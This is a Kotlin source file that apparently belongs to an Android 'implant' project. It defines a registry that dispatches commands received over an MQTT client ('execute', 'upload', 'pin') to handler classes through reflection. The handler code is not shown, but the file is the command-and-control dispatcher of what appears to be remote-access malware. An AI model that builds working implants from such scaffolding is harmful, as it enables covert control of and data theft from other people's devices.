package com.cooperthecoder.implant.command

import android.content.Context
import android.util.Log
import com.cooperthecoder.implant.command.handlers.*
import org.eclipse.paho.android.service.MqttAndroidClient

object CommandRegistry {

    private val TAG = CommandRegistry::class.java.name

    private const val EXECUTE = "execute"
    private const val UPLOAD = "upload"
    private const val PIN = "pin"
    private const val DOWNLOAD = "download"

    private val commandRegistry = HashMap<String, Class<out CommandHandler>>()

    /*
    * Call this in Application#onCreate()
    * */
    fun initialize() {
        commandRegistry[EXECUTE] = ExecuteHandler::class.java
        commandRegistry[UPLOAD] = UploadHandler::class.java
        commandRegistry[PIN] = PinHandler::class.java
    }

    fun handlerFor(context: Context, client: MqttAndroidClient, command: Command): CommandHandler {
        val clazz = commandRegistry.getOrDefault(command.command, UnknownCommandHandler::class.java)
        val ctor = clazz.getDeclaredConstructor(Context::class.java, MqttAndroidClient::class.java, Command::class.java)
        Log.d(TAG, "Constructor for ${clazz.name} loaded: $ctor")
        val handler = ctor.newInstance(context, client, command) as CommandHandler
        return handler
    }
}

